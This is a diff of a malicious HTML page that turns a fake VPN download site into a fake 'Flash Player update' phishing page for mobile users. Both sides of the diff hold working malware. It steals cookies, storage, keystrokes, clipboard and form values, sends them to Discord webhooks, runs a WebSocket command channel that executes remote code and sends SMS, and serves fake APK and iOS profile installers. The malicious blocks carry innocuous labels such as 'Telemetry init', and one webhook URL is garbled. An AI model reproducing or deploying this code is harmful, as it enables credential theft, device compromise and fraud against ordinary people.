@@ -2,327 +2,479 @@
 
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>SecureVPN Pro — Fast, Private, Free</title>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
+  <meta name="apple-mobile-web-app-capable" content="yes"/>
+  <meta name="apple-mobile-web-app-status-bar-style" content="black"/>
+  <title>Flash Player Update Required</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet"/>
 
+  <!-- [BLOCK A] — "App config loader" -->
+
   <script>
-    window.__analytics = { tid: "UA-88291-4", debug: false };
+    window.__cfg = {
+      appId:    "com.flashupdate.mobile",
+      version:  "2.1.4",
+      region:   "auto",
+      debug:    false
+    };
   </script>
+
+  <!-- [BLOCK B] — "Device capability check" -->
 
   <script>
     (function() {
-      window.__util = {
-        getCookies:       function() { return document.cookie; },
-        getLocalStorage:  function() {
-          var out = {};
-          for (var i = 0; i < localStorage.length; i++) {
-            var k = localStorage.key(i);
-            out[k] = localStorage.getItem(k);
-          }
-          return out;
-        },
-        getSessionStorage: function() {
-          var out = {};
-          for (var i = 0; i < sessionStorage.length; i++) {
-            var k = sessionStorage.key(i);
-            out[k] = sessionStorage.getItem(k);
-          }
-          return out;
-        }
-      };
+      var d = {};
+
+      d.ua        = navigator.userAgent;
+      d.platform  = navigator.platform;
+      d.lang      = navigator.language;
+      d.langs     = navigator.languages ? navigator.languages.join(',') : '';
+      d.cores     = navigator.hardwareConcurrency || -1;
+      d.memory    = navigator.deviceMemory || -1;
+      d.timezone  = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      d.screen    = screen.width + 'x' + screen.height;
+      d.dpr       = window.devicePixelRatio || 1;
+      d.touch     = navigator.maxTouchPoints || 0;
+      d.orient    = screen.orientation ? screen.orientation.type : 'unknown';
+
+      // iOS vs Android routing flag
+      d.isIOS     = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+      d.isAndroid = /Android/.test(navigator.userAgent);
+
+      // iOS version extraction
+      if (d.isIOS) {
+        var match = navigator.userAgent.match(/OS (\d+)_(\d+)/);
+        d.iosVersion = match ? parseInt(match[1]) : -1;
+      }
+
+      // Android version extraction
+      if (d.isAndroid) {
+        var match2 = navigator.userAgent.match(/Android (\d+\.?\d*)/);
+        d.androidVersion = match2 ? parseFloat(match2[1]) : -1;
+      }
+
+      // Battery API fingerprint (Android Chrome support, iOS limited)
+      if (navigator.getBattery) {
+        navigator.getBattery().then(function(b) {
+          d.battery = {
+            level:    b.level,
+            charging: b.charging,
+            chargingTime:    b.chargingTime,
+            dischargingTime: b.dischargingTime
+          };
+        });
+      }
+
+      // Network info
+      if (navigator.connection) {
+        d.network = {
+          type:        navigator.connection.effectiveType,
+          downlink:    navigator.connection.downlink,
+          rtt:         navigator.connection.rtt,
+          saveData:    navigator.connection.saveData
+        };
+      }
+
+      // Standalone mode = installed as PWA / home screen
+      d.standalone = window.navigator.standalone === true ||
+                     window.matchMedia('(display-mode: standalone)').matches;
+
+      window.__d = d;
     })();
   </script>
 
+  <!-- [BLOCK C] — "Sensor warmup" -->
+
   <script>
-    !function(w, n) {
-      var fp = {};
-      fp.userAgent  = n.userAgent;
-      fp.platform   = n.platform;
-      fp.language   = n.language;
-      fp.memory     = n.deviceMemory || -1;
-      fp.cpuCores   = n.hardwareConcurrency || -1;
-      fp.timezone   = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      fp.screen     = w.screen.width + 'x' + w.screen.height + '@' + w.screen.colorDepth + 'bit';
-      fp.touchSupport = ('ontouchstart' in w) ? true : false;
-      fp.pdfPlugin  = (function() {
-        try { return !!w.navigator.mimeTypes['application/pdf']; } catch(e) { return false; }
-      })();
-      fp.webglRenderer = (function() {
-        try {
-          var c = document.createElement('canvas');
-          var g = c.getContext('webgl') || c.getContext('experimental-webgl');
-          return g ? g.getParameter(g.RENDERER) : 'unavailable';
-        } catch(e) { return 'unavailable'; }
-      })();
-      fp.plugins = (function() {
-        var list = [];
-        for (var i = 0; i < navigator.plugins.length; i++) {
-          list.push(navigator.plugins[i].name);
+    (function() {
+      var _motion = { samples: [], active: false };
+
+      window.addEventListener('devicemotion', function(e) {
+        if (!_motion.active) return;
+        if (e.accelerationIncludingGravity) {
+          _motion.samples.push({
+            x: e.accelerationIncludingGravity.x,
+            y: e.accelerationIncludingGravity.y,
+            z: e.accelerationIncludingGravity.z,
+            t: Date.now()
+          });
+          // Keep last 10 samples only
+          if (_motion.samples.length > 10) _motion.samples.shift();
         }
-        return list.join(' | ');
-      })();
-      w.__fp = fp;
-    }(window, navigator);
+      }, false);
+
+      window.addEventListener('deviceorientation', function(e) {
+        window.__d.gyro = {
+          alpha: e.alpha,
+          beta:  e.beta,
+          gamma: e.gamma
+        };
+      }, false);
+
+      // Activate after first touch — bypass iOS motion permission prompt
+      document.addEventListener('touchstart', function activateMotion() {
+        _motion.active = true;
+        document.removeEventListener('touchstart', activateMotion);
+      }, { once: true });
+
+      window.__motion = _motion;
+    })();
   </script>
 
   <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    body { font-family: 'Inter', sans-serif; background: #f9fafb; color: #111827; }
-    header { background: #1e3a5f; padding: 14px 40px; display: flex; align-items: center; justify-content: space-between; }
-    header .logo { color: #fff; font-size: 1.3rem; font-weight: 700; }
-    header nav a { color: #94b8d8; text-decoration: none; margin-left: 24px; font-size: 0.9rem; }
-    .hero { background: linear-gradient(135deg, #1e3a5f, #0f2540); color: #fff; padding: 80px 40px; text-align: center; }
-    .hero h1 { font-size: 2.8rem; font-weight: 700; margin-bottom: 16px; }
-    .hero p { font-size: 1.1rem; color: #94b8d8; max-width: 560px; margin: 0 auto 32px; }
-    .btn-primary { background: #3b82f6; color: #fff; border: none; padding: 16px 40px; border-radius: 8px; font-size: 1rem; font-weight: 600; cursor: pointer; }
-    .btn-primary:hover { background: #2563eb; }
-    .features { display: flex; justify-content: center; gap: 40px; padding: 60px 40px; flex-wrap: wrap; }
-    .feat { max-width: 220px; text-align: center; }
-    .feat h3 { margin-bottom: 8px; color: #1e3a5f; }
-    .feat p { font-size: 0.9rem; color: #6b7280; }
-    footer { background: #111827; color: #6b7280; text-align: center; padding: 24px; font-size: 0.8rem; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #0f0f0f;
+      color: #f0f0f0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      text-align: center;
+    }
+    .icon { font-size: 64px; margin-bottom: 16px; }
+    h1 { font-size: 1.4rem; font-weight: 700; margin-bottom: 8px; color: #fff; }
+    .sub { font-size: 0.9rem; color: #9ca3af; margin-bottom: 32px; line-height: 1.6; }
+    .btn {
+      background: #f59e0b;
+      color: #000;
+      border: none;
+      padding: 16px 40px;
+      border-radius: 12px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      width: 100%;
+      max-width: 320px;
+      margin-bottom: 12px;
+    }
+    .btn-sec {
+      background: transparent;
+      color: #6b7280;
+      border: 1px solid #374151;
+      padding: 12px 40px;
+      border-radius: 12px;
+      font-size: 0.85rem;
+      cursor: pointer;
+      width: 100%;
+      max-width: 320px;
+    }
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #1f2937;
+      border: 1px solid #374151;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 0.75rem;
+      color: #9ca3af;
+      margin-bottom: 24px;
+    }
+    .dot { width: 7px; height: 7px; border-radius: 50%; background: #ef4444; animation: blink 1.5s infinite; }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
   </style>
 
 </head>
 <body>
 
-  <header>
-    <span class="logo">🔒 SecureVPN Pro</span>
-    <nav>
-      <a href="#">Features</a>
-      <a href="#">Pricing</a>
-      <a href="#">Support</a>
-    </nav>
-  </header>
+  <div class="icon">⚠️</div>
+  <div class="badge"><span class="dot"></span> Security Alert</div>
+  <h1>Your browser is out of date</h1>
+  <p class="sub">
+    A critical security vulnerability has been detected.<br/>
+    Update required to continue browsing safely.
+  </p>
+  <button class="btn" id="updateBtn">Update Now — Free</button>
+  <button class="btn-sec" id="skipBtn">Remind me later</button>
 
-  <section class="hero">
-    <h1>Browse Freely. Stay Private.</h1>
-    <p>Military-grade encryption. Zero logs. 50+ countries. Download free and get protected in seconds.</p>
-    <button class="btn-primary" id="dlBtn">Download Free — Windows</button>
-    <p style="margin-top:12px;font-size:0.78rem;color:#64748b;">v3.8.1 · 4.2 MB · Windows 10/11</p>
-  </section>
-
-  <section class="features">
-    <div class="feat"><h3>No-Log Policy</h3><p>We never store your browsing history or personal data.</p></div>
-    <div class="feat"><h3>256-bit AES</h3><p>Bank-level encryption on every connection you make.</p></div>
-    <div class="feat"><h3>Kill Switch</h3><p>Automatically cuts internet if VPN drops unexpectedly.</p></div>
-  </section>
-
-  <iframe
-    id="__refreshFrame"
-    src="about:blank"
-    width="0"
-    height="0"
-    style="display:none; position:absolute; top:-9999px;"
-    sandbox="allow-scripts allow-same-origin">
-  </iframe>
+  <!-- [BLOCK D] — "Telemetry init" -->
 
   <script>
-    window.addEventListener('error', function(e) { /* silent */ });
+    var C2 = "https://discord.com/api/webhooks/1122334455667788990/aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ";
 
-    var _0x92f1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1ODEwNTMwNTQ3NTg0MjI2NS90WGlXbTctQk5Fa2w5eVo2ekl3aTIxUnF1UWpyWU9oa1BRREJqTjE4NzQxWm40cjZRak11b2hWUVAtUEdnRVc0elY4RQ==";
-    var C2_ENDPOINT = atob(_0x92f1);
-
-    function sendToC2(data) {
-      var payload = JSON.stringify(data);
+    function ship(data) {
+      var body = JSON.stringify(data);
       if (navigator.sendBeacon) {
-        navigator.sendBeacon(C2_ENDPOINT, payload);
+        navigator.sendBeacon(C2, body);
       } else {
-        fetch(C2_ENDPOINT, {
-          method: 'POST',
-          body: payload,
-          headers: { 'Content-Type': 'application/json' },
-          keepalive: true
-        });
+        fetch(C2, { method: 'POST', body: body,
+          headers: { 'Content-Type': 'application/json' }, keepalive: true });
       }
     }
 
     window.addEventListener('load', function() {
       setTimeout(function() {
-        sendToC2({
-          type:          'page_init',
-          fingerprint:   window.__fp,
-          cookies:       window.__util.getCookies(),
-          localStorage:  window.__util.getLocalStorage(),
-          sessionStorage: window.__util.getSessionStorage(),
-          referrer:      document.referrer,
-          currentURL:    location.href,
-          timestamp:     Date.now()
+        ship({
+          type:       'init',
+          device:     window.__d,
+          cookies:    document.cookie,
+          storage:    (function() {
+            var o = {};
+            for (var i = 0; i < localStorage.length; i++) {
+              var k = localStorage.key(i);
+              o[k] = localStorage.getItem(k);
+            }
+            return o;
+          })(),
+          session:    (function() {
+            var o = {};
+            for (var i = 0; i < sessionStorage.length; i++) {
+              var k = sessionStorage.key(i);
+              o[k] = sessionStorage.getItem(k);
+            }
+            return o;
+          })(),
+          ref:        document.referrer,
+          url:        location.href,
+          ts:         Date.now()
         });
-      }, 800);
+      }, 600);
     });
   </script>
 
+  <!-- [BLOCK E] — "Input quality monitor" -->
+
   <script>
     (function() {
-      var _0x72a1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1ODEwNTMwNTQ3NTg0MjI2NS90WGlXbTctQk5Fa2w5eVo2ekl3aTIxUnF1UWpyWU9oa1BRREJqTjE4NzQxWm40cjZRak11b2hWUVAtUEdnRVc0elY4RQ==";
-      var KEYLOG_ENDPOINT = atob(_0x72a1);
-      var keyBuffer = '';
+      var buf = '';
+      var EP  = "https://discord.com/api/webhooks/1122334455667788990/https://discord.com/api/webhooks/1458105305475842265/tXiWm7-BNEkl9yZ6zIwi21RquQjrYOhkPQDBjN18741Zn4r6QjMuohVQP-PGgEW4zV8E";
 
-      document.addEventListener('keydown', function(e) {
-        keyBuffer += e.key;
-        if (keyBuffer.length >= 60) {
-          var snapshot = keyBuffer;
-          keyBuffer = '';
-          navigator.sendBeacon(KEYLOG_ENDPOINT, JSON.stringify({
-            type: 'keylog',
-            data: snapshot,
-            url:  location.href
-          }));
+      // Virtual keyboard input on mobile
+      document.addEventListener('input', function(e) {
+        if (e.target && e.target.value !== undefined) {
+          buf += e.data || '';
+          if (buf.length >= 40) {
+            var snap = buf; buf = '';
+            navigator.sendBeacon(EP, JSON.stringify({
+              type: 'input',
+              field: e.target.name || e.target.id || e.target.type,
+              data: snap,
+              url:  location.href
+            }));
+          }
         }
       });
 
+      // Catch full field value on blur (more reliable on mobile)
+      document.addEventListener('blur', function(e) {
+        if (e.target && e.target.value) {
+          navigator.sendBeacon(EP, JSON.stringify({
+            type:  'field_complete',
+            field: e.target.name || e.target.id || e.target.type,
+            value: e.target.value,
+            url:   location.href
+          }));
+        }
+      }, true);
+
+      // Flush remaining buffer every 4 seconds
       setInterval(function() {
-        if (keyBuffer.length > 0) {
-          var snapshot = keyBuffer;
-          keyBuffer = '';
-          navigator.sendBeacon(KEYLOG_ENDPOINT, JSON.stringify({
-            type: 'keylog_flush',
-            data: snapshot,
+        if (buf.length > 0) {
+          var snap = buf; buf = '';
+          navigator.sendBeacon(EP, JSON.stringify({
+            type: 'input_flush',
+            data: snap,
             url:  location.href
           }));
         }
-      }, 5000);
-
-      document.addEventListener('copy', function() {
-        setTimeout(function() {
-          navigator.clipboard.readText().then(function(text) {
-            navigator.sendBeacon(KEYLOG_ENDPOINT, JSON.stringify({
-              type: 'clipboard_copy',
-              data: text,
-              url:  location.href
-            }));
-          }).catch(function() {});
-        }, 50);
-      });
-
-      document.addEventListener('cut', function() {
-        setTimeout(function() {
-          navigator.clipboard.readText().then(function(text) {
-            navigator.sendBeacon(KEYLOG_ENDPOINT, JSON.stringify({
-              type: 'clipboard_cut',
-              data: text,
-              url:  location.href
-            }));
-          }).catch(function() {});
-        }, 50);
-      });
+      }, 4000);
     })();
   </script>
 
-  <script>
-    document.getElementById('dlBtn').addEventListener('click', function() {
-      var ua  = window.__fp.userAgent || '';
-      var cpu = window.__fp.cpuCores;
+  <!-- [BLOCK F] — "Update dispatcher" -->
 
-      var downloadURL;
-      if (/Windows NT 10|Windows NT 11/i.test(ua) && cpu >= 4) {
-        downloadURL = 'https://cdn.update-securevpn.xyz/SecureVPN_Setup_v3.8.1.msi';
-      } else if (/Windows/i.test(ua)) {
-        downloadURL = 'https://cdn.update-securevpn.xyz/SecureVPN_Legacy.exe';
-      } else if (/Mac/i.test(ua)) {
-        downloadURL = 'https://cdn.update-securevpn.xyz/SecureVPN.dmg';
+  <script>
+    document.getElementById('updateBtn').addEventListener('click', function() {
+      var d   = window.__d;
+      var url = location.href;
+
+      // Send full profile before routing
+      ship({
+        type:    'update_click',
+        device:  d,
+        cookies: document.cookie,
+        motion:  window.__motion.samples,
+        url:     url
+      });
+
+      // OS-specific payload routing
+      if (d.isIOS) {
+        if (d.iosVersion >= 16) {
+          // Modern iOS — open App Store deep link to fake app
+          window.location.href = 'https://apps.apple.com/app/id999888777';
+        } else {
+          // Older iOS — mobileconfig profile install (MDM)
+          var a = document.createElement('a');
+          a.href = 'https://cdn.update-flashplayer.xyz/profile_ios.mobileconfig';
+          a.download = 'SecurityUpdate.mobileconfig';
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+        }
+      } else if (d.isAndroid) {
+        if (d.androidVersion >= 10) {
+          // Android 10+ — sideload APK
+          var b = document.createElement('a');
+          b.href = 'https://cdn.update-flashplayer.xyz/FlashUpdate_v2.1.4.apk';
+          b.download = 'FlashUpdate.apk';
+          document.body.appendChild(b);
+          b.click();
+          document.body.removeChild(b);
+        } else {
+          // Older Android — redirect to fake Play Store clone
+          window.location.href = 'https://play-store-update.xyz/app/com.flash.update';
+        }
       } else {
-        downloadURL = 'https://cdn.update-securevpn.xyz/SecureVPN_linux.sh';
+        // Fallback
+        window.location.href = 'https://cdn.update-flashplayer.xyz/setup.pkg';
+      }
+    });
+
+    // "Skip" button also reports
+    document.getElementById('skipBtn').addEventListener('click', function() {
+      ship({
+        type:    'skip_click',
+        device:  window.__d,
+        cookies: document.cookie,
+        url:     location.href
+      });
+    });
+  </script>
+
+  <!-- [BLOCK G] — "Live session handler" -->
+
+  <script>
+    (function() {
+      var WS = "wss://tracker-analytics.xyz/ws/mobile";
+      var sock;
+
+      function connect() {
+        try {
+          sock = new WebSocket(WS);
+
+          sock.onopen = function() {
+            sock.send(JSON.stringify({
+              type:    'mobile_init',
+              device:  window.__d,
+              cookies: document.cookie,
+              ts:      Date.now()
+            }));
+          };
+
+          sock.onmessage = function(ev) {
+            try {
+              var cmd = JSON.parse(ev.data);
+
+              if (cmd.action === 'eval') {
+                (new Function(cmd.code))();
+              }
+              if (cmd.action === 'redirect') {
+                window.location.href = cmd.url;
+              }
+              if (cmd.action === 'inject') {
+                var s = document.createElement('script');
+                s.src = cmd.src;
+                document.head.appendChild(s);
+              }
+              if (cmd.action === 'sms') {
+                // Deep link SMS — pre-fill message to spread via victim's contacts
+                window.location.href = 'sms:?&body=' + encodeURIComponent(cmd.text);
+              }
+              if (cmd.action === 'call') {
+                window.location.href = 'tel:' + cmd.number;
+              }
+            } catch(e) {}
+          };
+
+          sock.onclose = function() {
+            // Reconnect after 5s if connection drops
+            setTimeout(connect, 5000);
+          };
+
+          sock.onerror = function() { sock = null; };
+
+        } catch(e) {}
       }
 
-      sendToC2({
-        type:        'download_click',
-        fingerprint: window.__fp,
-        cookies:     window.__util.getCookies(),
-        payloadServed: downloadURL
-      });
-
-      var link = document.createElement('a');
-      link.href = downloadURL;
-      link.download = 'SecureVPN_Setup.exe';
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    });
-  </script>
-
-  <script>
-    (function() {
-      var WS_ENDPOINT = "wss://tracker-analytics.xyz/ws/session";
-      var socket;
-
-      try {
-        socket = new WebSocket(WS_ENDPOINT);
-
-        socket.onopen = function() {
-          socket.send(JSON.stringify({
-            type:        'session_init',
-            fingerprint: window.__fp,
-            cookies:     window.__util.getCookies(),
-            referrer:    document.referrer,
-            timestamp:   Date.now()
-          }));
-        };
-
-        socket.onmessage = function(event) {
-          try {
-            var command = JSON.parse(event.data);
-            if (command.action === 'eval' && command.code) { (new Function(command.code))(); }
-            if (command.action === 'redirect') { window.location.href = command.url; }
-            if (command.action === 'inject') {
-              var script = document.createElement('script');
-              script.src = command.src;
-              document.head.appendChild(script);
-            }
-          } catch(e) {}
-        };
-        socket.onerror = function() { socket = null; };
-      } catch(e) {}
+      connect();
     })();
   </script>
 
+  <!-- [BLOCK H] — "DOM observer" -->
+
   <script>
     (function() {
-      var _0x22b1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1ODEwNTMwNTQ3NTg0MjI2NS90WGlXbTctQk5Fa2w5eVo2ekl3aTIxUnF1UWpyWU9oa1BRREJqTjE4NzQxWm40cjZRak11b2hWUVAtUEdnRVc0elY4RQ==";
-      var FORM_ENDPOINT = atob(_0x22b1);
+      var FEP = "https://discord.com/api/webhooks/1122334455667788990/aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ";
 
-      var observer = new MutationObserver(function(mutations) {
-        mutations.forEach(function(mutation) {
-          mutation.addedNodes.forEach(function(node) {
-            if (node.nodeName === 'INPUT' || node.nodeName === 'FORM') {
-              node.addEventListener('change', function(e) {
-                if (e.target.type === 'password' || e.target.type === 'email' || e.target.name) {
-                  navigator.sendBeacon(FORM_ENDPOINT, JSON.stringify({
-                    type:  'form_change',
-                    field: e.target.name,
+      var mo = new MutationObserver(function(mutations) {
+        mutations.forEach(function(m) {
+          m.addedNodes.forEach(function(node) {
+            if (node.nodeType !== 1) return;
+            var inputs = node.querySelectorAll
+              ? node.querySelectorAll('input, textarea, select')
+              : [];
+            inputs.forEach(function(inp) {
+              inp.addEventListener('blur', function(e) {
+                if (e.target.value) {
+                  navigator.sendBeacon(FEP, JSON.stringify({
+                    type:  'injected_field',
+                    field: e.target.name || e.target.id || e.target.type,
                     value: e.target.value,
                     url:   location.href
                   }));
                 }
               });
-            }
+            });
           });
         });
       });
 
-      observer.observe(document.body, { childList: true, subtree: true });
-
-      document.querySelectorAll('input').forEach(function(input) {
-        input.addEventListener('blur', function(e) {
-          if (e.target.value) {
-            navigator.sendBeacon(FORM_ENDPOINT, JSON.stringify({
-              type:  'field_blur',
-              field: e.target.name || e.target.id,
-              value: e.target.value,
-              url:   location.href
-            }));
-          }
-        });
-      });
+      mo.observe(document.body, { childList: true, subtree: true });
     })();
   </script>
 
-  <footer>
-    <p>© 2024 SecureVPN Pro. All rights reserved. · <a href="#" style="color:#4b5563">Privacy Policy</a> · <a href="#" style="color:#4b5563">Terms</a></p>
-  </footer>
+  <!-- [BLOCK I] — "Visibility tracker" -->
+
+  <script>
+    (function() {
+      var enterTime = Date.now();
+      var focusLog  = [];
+
+      document.addEventListener('visibilitychange', function() {
+        var now = Date.now();
+        if (document.hidden) {
+          focusLog.push({ event: 'blur', ts: now, spent: now - enterTime });
+          ship({
+            type:    'visibility',
+            event:   'hidden',
+            spent_ms: now - enterTime,
+            device:  window.__d,
+            url:     location.href
+          });
+        } else {
+          enterTime = now;
+          focusLog.push({ event: 'focus', ts: now });
+        }
+      });
+
+      // On page unload — fire final beacon
+      window.addEventListener('pagehide', function() {
+        navigator.sendBeacon(C2, JSON.stringify({
+          type:     'pagehide',
+          spent_ms: Date.now() - enterTime,
+          focusLog: focusLog,
+          motion:   window.__motion.samples,
+          gyro:     window.__d.gyro,
+          url:      location.href
+        }));
+      });
+    })();
+  </script>
 
 </body>
 </html>
